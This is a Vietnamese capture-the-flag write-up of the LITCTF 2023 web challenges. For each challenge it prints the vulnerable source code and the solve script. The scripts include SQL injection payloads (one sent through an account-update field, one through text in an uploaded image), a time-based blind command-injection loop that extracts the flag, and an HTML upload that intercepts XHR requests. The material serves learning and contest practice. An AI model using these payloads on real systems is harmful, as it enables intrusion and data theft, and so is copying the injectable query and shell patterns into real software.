# **Lexington Informatics Tournament CTF 2023**

## **web/My boss left**
- Sau khi truy cập trang web chúng ta có một trang login. Chúng ta hãy đi tìm hiểu source cuả nó.

```php
<?php
// Check if the request is a POST request
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Read and decode the JSON data from the request body
    $json_data = file_get_contents('php://input');
    $login_data = json_decode($json_data, true);

    // Replace these values with your actual login credentials
    $valid_password = 'dGhpcyBpcyBzb21lIGdpYmJlcmlzaCB0ZXh0IHBhc3N3b3Jk';

    // Validate the login information
    if ($login_data['password'] == $valid_password) {
        // Login successful
        echo json_encode(['status' => 'success', 'message' => 'LITCTF{redacted}']);
    } else {
        // Login failed
        echo json_encode(['status' => 'error', 'message' => 'Invalid username or password']);
    }
}
?>
```
- Chúng ta nhận thầy rằng chỉ cần `password = 'dGhpcyBpcyBzb21lIGdpYmJlcmlzaCB0ZXh0IHBhc3N3b3Jk'` chúng ta có thể đăng nhập thành công.

![](./img_LIT/Screenshot%202023-08-16%20124215.png)

## **web/unsecure**

![](./img_LIT/Screenshot%202023-08-16%20124538.png)

- Truy cập đến trang web chúng ta có một đường đẫn đến `/welcome`. Và chúng ta có một trang thôn tin đăng nhập. Và đề bài đã gợi ý cho chúng ta password và tk.

![](./img_LIT/Screenshot%202023-08-16%20125451.png)

- Sau khi xem lịch sử ridect ta nhận thấy được flag đã có trong history burp:

![](./img_LIT/Screenshot%202023-08-16%20131301.png)

- Flag như sau: `LITCTF{0k4y_m4yb3_1_l13d}`

## **web/Ping Pong**

- Ở trang web này chúng ta hãy đọc source đề ra đã cho và nhận thấy rằng trang web này tồn tại lỗ hổng command injection.

- Source code như sau:

```python
from flask import Flask, render_template, redirect, request
import os

app = Flask(__name__)

@app.route('/', methods = ['GET','POST'])
def index():
    output = None
    if request.method == 'POST':
        hostname = request.form['hostname']
        cmd = "ping -c 3 " + hostname
        output = os.popen(cmd).read()

    return render_template('index.html', output=output)

```

- Tôi thực hiện khai thác như sau:

![](./img_LIT/Screenshot%202023-08-16%20132551.png)

## **web/amogsus-api**

- Chúng ta bắt đầu đi đọc source trang web như sau: 

```python
import random
import string
from flask import Flask, request, jsonify
import sqlite3
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

con = sqlite3.connect('database.db')

sessions = []

with sqlite3.connect('database.db') as con:
  cursor = con.cursor()
  cursor.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, sus BOOLEAN)')

@app.route('/', methods=['GET'])
def index():
  return jsonify({'message': 'Welcome to the amogsus API! I\'ve been working super hard on it in the past few weeks. You can use a tool like postman to test it out. Start by signing up at /signup. Also, I think I might have forgotten to sanatize an input somewhere... Good luck!'})


@app.route('/signup', methods=['POST'])
def signup():
  with sqlite3.connect('database.db') as con:
    cursor = con.cursor()
    data = request.form
    print(data)
    username = data['username']
    password = data['password']
    sus = False
    cursor.execute('SELECT * FROM users WHERE username=?', (username,))
    if cursor.fetchone():
      return jsonify({'message': 'Username already exists!'})
    else:
      cursor.execute('INSERT INTO users (username, password, sus) VALUES (?, ?, ?)', (username, password, sus))
      con.commit()
      return jsonify({'message': 'User created! You can now login at /login'})

@app.route('/login', methods=['POST'])
def login():
  with sqlite3.connect('database.db') as con:
    cursor = con.cursor()
    data = request.form
    try:
      username = data['username']
      password = data['password']
      cursor.execute('SELECT * FROM users WHERE username=? AND password=?', (username, password))
      user = cursor.fetchone()
      if user:
        randomToken = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(40))
        while randomToken in sessions:
          randomToken = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(40))
        sessions.append({'username': username, 'token': randomToken})
        return jsonify({'message': 'Login successful! You can find your account information at /account. Make sure to provide your token! You should know how to bear your Authorization...', 'token': randomToken})
      else:
        return jsonify({'message': 'Login failed!'})
    except Exception as e:
      print(e)
      return jsonify({'message': 'Please provide your username and password as form-data or x-www-form-urlencoded!'})
    

@app.route('/account', methods=['GET'])
def account():
  with sqlite3.connect('database.db') as con:
    cursor = con.cursor()
    token = request.headers.get('Authorization', type=str)
    token = token.replace('Bearer ', '')
    if token:
      for session in sessions:
        if session['token'] == token:
          cursor.execute('SELECT * FROM users WHERE username=?', (session['username'],))
          user = cursor.fetchone()
          return jsonify({'message': 'Here is your account information! You can update your account at /account/update. The flag can also be found at /flag. You need to be sus to get access tho...', 'username': user[1], 'sus': user[3], "password": user[2]})
      return jsonify({'message': 'Invalid token!'})
    else:
      return jsonify({'message': 'Please provide your token!'})
    
@app.route('/account/update', methods=['POST'])
def update():
  with sqlite3.connect('database.db') as con:
    cursor = con.cursor()
    token = request.headers.get('Authorization', type=str)
    token = token.replace('Bearer ', '')
    if token:
      for session in sessions:
        if session['token'] == token:
          data = request.form
          username = data['username']
          password = data['password']
          if (username == '' or password == ''):
            return jsonify({'message': 'Please provide your new username and password as form-data or x-www-form-urlencoded!'})
          cursor.execute(f'UPDATE users SET username="{username}", password="{password}" WHERE username="{session["username"]}"')
          con.commit()
          session['username'] = username
          return jsonify({'message': 'Account updated!'})
      return jsonify({'message': 'Invalid token!'})
    else:
      return jsonify({'message': 'Please provide your token!'})

@app.route('/flag', methods=['GET'])
def flag():
  with sqlite3.connect('database.db') as con:
    cursor = con.cursor()
    token = request.headers.get('Authorization', type=str)
    token = token.replace('Bearer ', '')
    if token:
      for session in sessions:
        if session['token'] == token:
          cursor.execute('SELECT * FROM users WHERE username=?', (session['username'],))
          user = cursor.fetchone()
          if user[3]:
            return jsonify({'message': f'Congrats! The flag is: flag{open("./flag.txt", "r").read()}'})
          else:
            return jsonify({'message': 'You need to be an sus to view the flag!'})
      return jsonify({'message': 'Invalid token!'})
    else:
      return jsonify({'message': 'Please provide your token!'})
    

if __name__ == '__main__':
  app.debug = True
  app.run(host='0.0.0.0', port=8080)
```

- Sau khi đọc source ta biết rằng để đọc được flag chúng ta phải có `user[3]: true hay sus = 1`. Thật may mắn cho chúng ta là ở trạng thái uydate tài khoản chúng ta có thể sqlinjection sqlite3. Tôi đã viết một script tấn công như sau:
```python
import requests, json

url = 'http://litctf.org:31783'
# Need username each try
creds = {'username':'abcdefghi', 'password': '", sus="1'}
r = requests.post(f'{url}/signup', data=creds)
print(r.text)
r = requests.post(f'{url}/login', data=creds)
print(r.text)
token = json.loads(r.text)['token']
auth_header = {'Authorization': f'Bearer {token}'}
r = requests.get(f'{url}/account', headers=auth_header)
print(r.text)
r = requests.post(f'{url}/account/update', headers=auth_header, data=creds)
print(r.text)
r = requests.get(f'{url}/account', headers=auth_header)
print(r.text)
r = requests.get(f'{url}/flag', headers=auth_header)
print(r.text)

#{"message":"User created! You can now login at /login"}

#{"message":"Login successful! You can find your account information at /account. Make sure to provide your token! You should know how to bear your Authorization...","token":"A3K8LJ6H76W2ACKDOBZYLLJQOGHO1NAZWSUV05TD"}

#{"message":"Here is your account information! You can update your account at /account/update. The flag can also be found at /flag. You need to be sus to get access tho...","password":"\", sus=\"1","sus":0,"username":"abcdefghi"}

#{"message":"Account updated!"}

#{"message":"Here is your account information! You can update your account at /account/update. The flag can also be found at /flag. You need to be sus to get access tho...","password":"","sus":1,"username":"abcdefghi"}

#{"message":"Congrats! The flag is: flagLITCTF{1njeC7_Th3_sUs_Am0ng_U5}"}
```
## **web/license-inject**

- Sau khi đọc source code trang web như sau:

```javascript
import { error, json } from '@sveltejs/kit';
import type { RequestHandler } from '@sveltejs/kit';
import path from 'path';
import fs from 'fs/promises';
import { createWorker } from 'tesseract.js';

import { dirname } from 'path';
import { fileURLToPath } from 'url';
import mime from 'mime-types';
import sqlite from 'sqlite3';
import randomName from 'random-name';

// @ts-ignore
import { getTextFromImage, isSupportedFile } from '@shelf/aws-lambda-tesseract';

const __dirname = dirname(fileURLToPath(import.meta.url));

const genPlate = (maxLength = 7) =>
	Array(Math.floor(Math.random() * maxLength) + 1)
		.fill('')
		.map(() => 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 36)])
		.join('');

// @ts-ignore
export const POST: RequestHandler = async ({ request }) => {
	const data = await request.formData();
	const filePath = path.join(
		process.env.NODE_ENV === 'development' ? __dirname : '',
		process.env.NODE_ENV === 'development' ? '../../../uploads' : '/tmp/',
		Array(30)
			.fill('')
			.map(
				() =>
					'wertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890-'[
						Math.floor(Math.random() * 63)
					]
			)
			.join('') +
			'.' +
			mime.extension((data.get('file') as File).type)
	);
	const file = data.get('file') as File;
	if (!file) {
		return error(400, 'No file');
	}

	await fs.writeFile(filePath, new Uint8Array(await file.arrayBuffer()));
	console.log('wrote file yay!!');
	try {
		let text: string;
		// if (process.env.NODE_ENV === 'development') {
		// eslint-disable-next-line no-constant-condition
		if (true) {
			const worker = await createWorker({
				logger: (m) => console.log((m.progress * 100).toString() + '%'),
				// workerPath: path.join(process.cwd(), 'static', 'tesseract/worker.min.js'),
				// langPath: 'https://tessdata.projectnaptha.com/4.0.0',
				corePath: path.join(process.cwd(), 'static', 'tesseract/tesseract-core-simd.js')
			});

			await worker.loadLanguage('eng');
			await worker.initialize('eng');
			const {
				data: { text: ogText }
			} = await worker.recognize(filePath);
			await worker.terminate();
			text = ogText.trim();
		} else {
			const ogText = (await getTextFromImage(filePath)) as string;
			text = ogText.trim();
		}
		try {
			fs.unlink(filePath);
		} catch (e) {
			console.warn('failed to unlink');
		}

		try {
			const db = new sqlite.Database(
				path.join(
					process.env.NODE_ENV === 'development' ? __dirname : '',
					process.env.NODE_ENV === 'development' ? '../../../' : '/tmp/',
					'data.db'
				)
			);
			db.configure('busyTimeout', 1000);
			console.log('created db');
			const plate = await new Promise((resolve, reject) => {
				const genName = (() => {
					const names: string[] = ['John Doe'];
					return () => {
						const name = randomName.first() + randomName.last();
						if (names.includes(name)) return genName();
						names.push(name);
						return name;
					};
				})();
				const oops = (err: Error) => {
					// clean up db
					db.close();
					try {
						fs.unlink(
							path.join(
								process.env.NODE_ENV === 'development' ? __dirname : '',
								process.env.NODE_ENV === 'development' ? '../../../' : '/tmp/',
								'data.db'
							)
						);
					} catch (e) {
						console.warn('failed to unlink in error');
					}
					return reject(err);
				};
				// create db
				db.run(
					`CREATE TABLE IF NOT EXISTS plates (name TEXT, plate string, fine TEXT, PRIMARY KEY (name))`,
					(err) => {
						if (err) return oops(err);
						console.log('created table');
						// populate db with plates
						const dbSize = 1000;
						const plates = Array(dbSize)
							.fill({ name: '', number: 0, fine: '' })
							// @ts-ignore
							.map(() => ({
								name: genName(),
								plate: genPlate(),
								fine: '$' + Math.round(Math.random() * 1000).toString()
							}));
						plates.push({
							name: 'codetiger',
							// very long random string
							plate: Array(40)
								.fill('')
								.map(() => 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 36)])
								.join(''),
							fine: 'LITCTF{redacted}'
						});
						plates.push({
							name: 'Sample User',
							plate: '215BG2',
							fine: '$6942'
						});
						db.serialize(() => {
							console.log('going to fill table');
							db.run('BEGIN TRANSACTION');
							const stmt = db.prepare('INSERT INTO plates VALUES (?, ?, ?)');
							let c = 0;
							for (const plate of plates) {
								c++;
								console.clear();
								console.log('pushing plate', c, '/', dbSize);
								stmt.run(plate.name, plate.plate, plate.fine);
							}
							stmt.finalize();
							db.run('COMMIT', (err) => {
								if (err) return oops(err);
								console.log('Text:', text);

								// try get license plate with plate of text
								console.log('filled table');
								console.log('attempting to query plate: ' + text);
								db.get(`SELECT * FROM plates WHERE plate = "${text}"`, (err, row) => {
									if (err) return oops(err);
									console.log('queried plate');
									// clean up db
									db.close(() => {
										try {
											fs.unlink(
												path.join(
													process.env.NODE_ENV === 'development' ? __dirname : '',
													process.env.NODE_ENV === 'development' ? '../../../' : '/tmp/',
													'data.db'
												)
											);
										} catch (e) {
											console.warn('failed to unlink in error');
										}
										resolve(row ? row : `Plate with text <code>${text}</code> not found.`);
									});
								});
							});
						});
					}
				);
			});
			return json(plate);
		} catch (e) {
			console.error(e);
			return error(400, 'Invalid license plate. Error that occured: ' + (e as Error).message);
		}
	} catch (e) {
		try {
			fs.unlink(filePath);
		} catch (e) {
			console.warn('failed to unlink in error');
		}
		console.error(e);
		return error(500, 'An error occured while trying to extract text');
	}
};
```

- Trước tiên, chúng tôi quan sát thấy rằng cờ được lưu trữ trong đối tượng sau:

```
{
    name: 'codetiger',
    // very long random string
    plate: Array(40)
        .fill('')
        .map(() => 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 36)])
        .join(''),
    fine: 'LITCTF{redacted}'
}
```

- Và ở đây chúng ta có lỗ hổng sql injection ở `SELECT * FROM plates WHERE plate = "${text}"`

- Vậy tôi thực hiện tấn công như sau:
```python
import requests, json, io
from PIL import Image, ImageDraw, ImageFont

def create_image(text):

    font = ImageFont.truetype("Arial.ttf", 50)
    img_width, img_height = (1000, 100)
    img = Image.new('RGB', (img_width, img_height), (255, 255, 255))
    d = ImageDraw.Draw(img)
    text_width = d.textlength(text)
    d.text((100, 20), text, fill=(0, 0, 0), font=font)
    img.save("plate.jpg")
    img_byte_arr = io.BytesIO()
    img.save(img_byte_arr, format='PNG')
    img_byte_arr = img_byte_arr.getvalue()
    return img_byte_arr

def upload(img_bytes):
    url = 'http://34.130.180.82:59024/'
    r = requests.post(url + 'api', files = {'file': img_bytes})
    print(r.text)


upload(create_image('123" OR name="codetiger'))
#{"name":"codetiger","plate":"XEX9IT3VRLZFW1A5TJATU1PAWLN3JKICDILYX39U","fine":"LITCTF{cant_escape_codetiger}"}

```
## **web/Ping Pong: Under**

- Đây là một challeng nâng cao hơn so với ping pong, và nó vẫn tiếp tục với lỗ hổng command injection.

- Do lỗ hổng chèn lệnh không còn hiển thị nên chúng ta cần sử dụng các cơ chế khác để tìm cờ. Tôi đã chọn sử dụng một cuộc tấn công dựa trên thời gian trong đó chúng tôi sẽ ngủ thêm 2 giây nếu một ký tự của lá cờ khớp với dự đoán của chúng tôi. Sau đó, chúng tôi sử dụng phương pháp này để liệt kê tất cả các ký tự cờ. Kịch bản giải quyết như sau:

```python
import time
import requests

charset = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_'

URL = "http://34.130.180.82:59378/"
flag = "LITCTF{"

while True:
    for c in charset:
        payload = f"-h || if [ $(grep -r -h '{flag+c}') ]; then sleep 1.5; fi"
        
        t = time.time()
        response = requests.post(URL, data={'hostname': payload})
        
        if time.time() - t > 1:
            flag += c
            print(flag)
            break
    
    if flag.endswith('}'):
        print(f"Flag recovered: {flag}")
        break

    ----------------------------------------------------
LITCTF{c
LITCTF{c4
LITCTF{c4r
LITCTF{c4re
LITCTF{c4ref
LITCTF{c4refu
LITCTF{c4refu1
LITCTF{c4refu1_
LITCTF{c4refu1_f
LITCTF{c4refu1_fr
LITCTF{c4refu1_fr}
Flag recovered: LITCTF{c4refu1_fr}
```

## **web/fetch**

- Đọc source đề cho như sau:

```javascript
import puppeteer from "puppeteer";
import { randomString, startFlagServer } from "./flag_server";
import express from "express";
import fileUpload from "express-fileupload";
import fs from "fs";

const runHTMLFile = async (filePath) => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  await page.goto(`file:${filePath}`);

  await page.evaluate(() => {
    const req = new window.XMLHttpRequest();
    req.open("GET", "http://localhost:6969/" + randomString, false);
    req.send(null);
  });
  const screenshot = await page.screenshot({
    path: filePath.replace(".html", ".png"),
    fullPage: true,
    type: "png",
  });
  await browser.close();

	return filePath.replace(".html", ".png");
};

const app = express();
app.use(fileUpload());
const port = 4242;
app.get("/", (req, res) => res.sendFile("index.html"));
app.get("/runHTML", async (req, res) => {
	// takes html file upload, saves it to "/uploads" + random string .html, runs it with the runHTMLFile function, and returns the screenshot
	const file = req.files.file;
	if (!file) {
		res.status(400).send("No file uploaded");
		return;
	}
	if (!file.mimetype.includes("html")) {
		res.status(400).send("File is not HTML");
		return;
	}

	const filePath = `/uploads/${Math.random().toString(36).substring(7)}.html`;
	fs.writeFileSync(filePath, file.data);
	const outputFilePath = runHTMLFile(filePath);
	res.sendFile(outputFilePath);
	// delete the files
	fs.rmSync(filePath);
	fs.rmSync(outputFilePath);
});

app.get('/sus.js', (req, res) => res.sendFile('sus.js'))

app.listen(port, () => console.log(`app listening on port ${port}!`));
startFlagServer();
```

- mục tiêu chính của chúng ta là chặn yêu cầu AJAX được gửi tới máy chủ cờ (http://localhost:6969) trong hàm runHTMLFile, tức là:

- Một số tìm kiếm trực tuyến cung cấp cơ chế sau để ghi đè chức năng của XMLHttpRequest.prototype.open khi nhận được phản hồi. Đây là nội dung trong file fetchsolvehtml.html để sử dụng trong tập lệnh giải quyết của tôi:

```html
<html>
    <script>
        // https://gilfink.medium.com/quick-tip-creating-an-xmlhttprequest-interceptor-1da23cf90b76
        let oldXHROpen = window.XMLHttpRequest.prototype.open;window.XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
            this.addEventListener('load', function() {
                document.write(this.responseText);
            });        
            return oldXHROpen.apply(this, arguments);
        }
    </script>
</html>
```
- Khi điều này được thực hiện, máy chủ sẽ trả về ảnh chụp màn hình của trang web hiện chứa cờ sau khi thực hiện document.write(this.responseText); bên trên. Kịch bản giải quyết để hoàn thành việc này như sau:

```python
import requests

url = 'http://litctf.org:31770'

r = requests.post(url + '/runHTML', files = {'file': ('file.html', open('fetchsolvehtml.html', 'rb').read(), 'text/html')})
print(r.status_code)
with open('fetch_response.png', 'wb') as f:
    f.write(r.content)


# LITCTF{wow_i_actually_love_the_fetch}
```
